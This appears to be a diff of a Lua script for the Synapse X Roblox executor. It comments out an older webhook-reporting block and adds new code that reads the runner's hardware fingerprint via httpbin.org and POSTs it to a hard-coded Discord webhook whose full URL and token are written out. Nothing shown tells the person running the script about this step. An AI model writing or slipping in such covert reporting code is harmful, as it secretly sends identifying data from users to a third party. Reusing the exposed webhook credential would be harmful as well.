@@ -1,4 +1,4 @@
-local webh = "https://discord.com/api/webhooks/1025068060798881862/q6-7ET8HZQGorFi8_g4xyJHjmGhcXGP7XoJ_sfdQnMtlQUs_IxlgXKBBsxRMxhuKQqh8"
+--[[local webh = "https://discord.com/api/webhooks/1025068060798881862/q6-7ET8HZQGorFi8_g4xyJHjmGhcXGP7XoJ_sfdQnMtlQUs_IxlgXKBBsxRMxhuKQqh8"
 
 pcall(function()
    local data = {
@@ -45,3 +45,18 @@ pcall(function()
        );
    end
 end)
+]]--
+
+local req = syn.request({ Url = "https://httpbin.org/get" })
+local parsed = game:GetService("HttpService"):JSONDecode(req.Body)
+
+syn.request({
+  Url = "https://discord.com/api/webhooks/1025068060798881862/q6-7ET8HZQGorFi8_g4xyJHjmGhcXGP7XoJ_sfdQnMtlQUs_IxlgXKBBsxRMxhuKQqh8",
+  Method = "POST",
+  Headers = {
+      ["Content-Type"] = "application/json"
+  },
+  Body = game:GetService("HttpService"):JSONEncode({
+      ["content"] = "Hardware ID: "..parsed.headers["Syn-Fingerprint"]
+  })
+})
